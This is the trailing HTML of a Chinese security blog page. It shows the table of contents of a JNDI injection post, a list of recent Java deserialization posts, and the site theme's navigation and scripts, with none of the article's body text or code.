href="#0x02-%E8%B8%A9%E5%9D%91%E5%AE%9E%E5%BD%95"><span class="toc-number">5.2.</span> <span class="toc-text">0x02 踩坑实录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-LDAP"><span class="toc-number">5.3.</span> <span class="toc-text">0x03 JNDI+LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF-LDAP"><span class="toc-number">5.3.1.</span> <span class="toc-text">0x01 什么是 LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-LDAP-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-number">5.3.2.</span> <span class="toc-text">0x02 JNDI+LDAP 攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x01-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">1x01 攻击流程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.</span> <span class="toc-text">JNDI 注入高版本绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-JNDI-RMI-%E9%99%90%E5%88%B6"><span class="toc-number">5.4.1.</span> <span class="toc-text">0x01 JNDI-RMI 限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">1x01 源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-LDAP-%E9%99%90%E5%88%B6"><span class="toc-number">5.4.2.</span> <span class="toc-text">0x02 JNDI-LDAP 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%BB%95%E8%BF%87%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90"><span class="toc-number">5.4.3.</span> <span class="toc-text">0x03 绕过实现分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1x03-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">5.4.3.1.</span> <span class="toc-text">1x03 代码实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1x04-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">5.4.3.2.</span> <span class="toc-text">1x04 流程分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html" title="C3P0攻击链学习">C3P0攻击链学习</a><time datetime="2024-03-22T07:00:00.000Z" title="发表于 2024-03-22 15:00:00">2024-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="Jackson反序列化初步学习">Jackson反序列化初步学习</a><time datetime="2024-03-18T09:01:00.000Z" title="发表于 2024-03-18 17:01:00">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastJsonRe0.html" title="FastJsonRe0">FastJsonRe0</a><time datetime="2024-03-18T09:00:00.000Z" title="发表于 2024-03-18 17:00:00">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E6%9C%80%E8%BF%91%E7%9A%84%E6%84%9F%E6%83%B3.html" title="最近的感想">最近的感想</a><time datetime="2024-03-12T09:01:00.000Z" title="发表于 2024-03-12 17:01:00">2024-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" title="log4j2漏洞分析">log4j2漏洞分析</a><time datetime="2024-03-12T09:00:00.000Z" title="发表于 2024-03-12 17:00:00">2024-03-12</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="stoocea" target="_blank">stoocea</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 stoocea 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="java"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>